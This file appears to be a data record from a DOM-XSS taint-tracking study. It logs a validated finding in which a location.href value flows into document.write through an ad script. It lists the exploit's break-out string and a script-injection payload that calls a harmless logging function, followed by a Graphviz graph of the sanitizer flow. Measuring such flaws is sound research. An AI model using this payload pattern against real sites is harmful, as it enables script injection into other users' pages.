@@ -1,0 +1,106 @@
+// Finding: 77904afd-45a0-4cdc-9cb9-bc4f6c001947
+// Finding.url: https://example154.com/tracking-covid-19-with-excel
+// Finding.parentloc: https://example154.com/tracking-covid-19-with-excel##'></iframe></style></script></object></embed></textarea><script>taintfoxLog('fc696185be9643359928bf3340751861')</script><!--/*
+// Finding.domain: example154.com
+// Finding.base_domain: example154.com
+// Finding.source: location.href
+// Finding.sink: document.write
+// Sanitizer.score: 1
+// Sanitizer.name: SekindoClientDetections_URL/this.setInfo
+// Sanitizer.location: https://live.example5.com/live/liveView.php?s=103027&cbuster=1743134467&pubUrl=https://example154.com/tracking-covid-19-with-excel%23%23%27%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cscript%3EtaintfoxLog(%27fc696185be9643359928bf3340751861%27)%3C/script%3E%3C!--/*&subId=[SUBID_ENCODED] - SekindoClientDetections_URL/this.setInfo:621:7
+// Finding.begin: 433
+// Finding.end: 610
+// Finding.original_uuid: 2b4464f4-f446-4592-9b68-e5e79d9d4ef5
+// Finding.TwentyFiveMillionFlowsId: -929345182
+// Finding.script: https://live.example5.com/live/liveView.php?s=103027&cbuster=1743134467&pubUrl=https://example154.com/tracking-covid-19-with-excel%23%23%27%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cscript%3EtaintfoxLog(%27fc696185be9643359928bf3340751861%27)%3C/script%3E%3C!--/*&subId=[SUBID_ENCODED]
+// Finding.line: 914
+// Exploit.uuid: fc696185-be96-4335-9928-bf3340751861
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: '
+// Exploit.tag: script
+// Exploit.break_out: #'></iframe></style></script></object></embed></textarea><script>
+// Exploit.break_in: </script><!--/*
+// Exploit.payload: #'></iframe></style></script></object></embed></textarea><script>taintfoxLog(1)</script><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 49
+// Exploit.replace_begin_url: 49
+// Exploit.replace_end_url: 49
+// Exploit.replace_begin_param: 250
+// Exploit.replace_end_param: 250
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1709519641
+// DepGraph.sanitizer_hash: -1582645227
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="encodeURIComponent"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: &pubUrlAuto="];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit: https://live.example5.com/live/liveView.php?s=103027&cbuster=17....%3C/script%3E%3C!--/*&subId=[SUBID_ENCODED]&cbuster=1621066701"];
+n7 [shape=ellipse, label="str_replace_once"];
+n8 [shape=box, label="Lit: SEKXLEN"];
+n9 [shape=box, label="Lit: 750"];
+n10 [shape=box, label="Var: x"];
+n11 [shape=ellipse, label="str_replace_once"];
+n12 [shape=box, label="Lit: SEKYLEN"];
+n13 [shape=box, label="Lit: 350"];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="str_replace_once"];
+n16 [shape=box, label="Lit: '"];
+n17 [shape=box, label="Lit: %27"];
+n18 [shape=box, label="Var: x"];
+n19 [shape=ellipse, label="."];
+n20 [shape=box, label="Lit: &csuuid=609f83cd9e41a"];
+n21 [shape=ellipse, label="."];
+n22 [shape=box, label="Lit: &videoType=flow&floatWidth=400&floatHeight=225&floatDirection=....0&floatCloseBtn=1&flowMode=below&flowCloseButtonPosition=right"];
+n23 [shape=box, label="Var: x"];
+n24 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n4;
+n3 -> n1;
+n5 -> n6;
+n5 -> n3;
+n10 -> n5;
+n7 -> n8;
+n7 -> n9;
+n7 -> n10;
+n14 -> n7;
+n11 -> n12;
+n11 -> n13;
+n11 -> n14;
+n18 -> n11;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n19 -> n15;
+n19 -> n20;
+n21 -> n19;
+n21 -> n22;
+n23 -> n21;
+n24 -> n23;
+}
